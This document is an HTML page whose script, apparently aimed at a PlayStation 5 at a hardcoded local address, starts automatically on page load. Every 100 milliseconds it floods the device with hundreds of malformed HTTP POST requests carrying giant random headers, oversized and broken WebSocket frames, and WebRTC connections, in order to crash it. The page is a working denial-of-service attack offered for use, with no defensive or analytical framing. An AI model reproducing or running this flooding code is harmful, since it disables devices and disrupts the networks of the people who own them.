<!DOCTYPE html>
<html>
<head>
    <title>PS5 Network Bruteforce - Max Power</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>PS5 Network Bruteforce - Max Power</h1>
    <div id="status">Preparando...</div>

    <script>
        const PS5_IP = "192.168.137.200";

        function randomString(length) {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}|;:',.<>/?`~";
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        function crashFetch() {
            for (let i = 0; i < 500; i++) {
                fetch(`http://${PS5_IP}/${randomString(500)}`, {
                    method: 'POST',
                    headers: {
                        [randomString(100)]: randomString(10000),  // Header corrupto gigante
                        "Content-Length": "99999999" // Header absurdo
                    },
                    body: randomString(200000),
                    mode: 'no-cors',
                    cache: 'no-store',
                    keepalive: true,
                }).catch(() => {});
            }
        }

        function crashWebSocket() {
            for (let i = 0; i < 100; i++) {
                try {
                    let ws = new WebSocket(`ws://${PS5_IP}/${randomString(100)}`);
                    ws.onopen = () => {
                        ws.send(randomString(65535)); // Frame WebSocket gigante
                        ws.send("\x80\xff\xff\xff");   // Frame WebSocket mal formado
                        ws.close();
                    };
                    ws.onerror = () => {};
                } catch (e) {}
            }
        }

        function crashWebRTC() {
            for (let i = 0; i < 100; i++) {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: `stun:${PS5_IP}:3478` }]
                    });
                    const channel = pc.createDataChannel(randomString(50));
                    channel.onopen = () => {
                        channel.send(randomString(65535)); // Paquetes gigantes
                        channel.send("\xff\xff\xff\xff"); // Datos rotos
                    };
                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                } catch (e) {}
            }
        }

        function crashLoop() {
            crashFetch();
            crashWebSocket();
            crashWebRTC();
        }

        function startAttack() {
            document.getElementById('status').textContent = `¡Atacando ${PS5_IP}!`;

            // Lanza cada 100ms (¡rápido!)
            setInterval(crashLoop, 100);
        }

        window.onload = startAttack;
    </script>
</body>
</html>
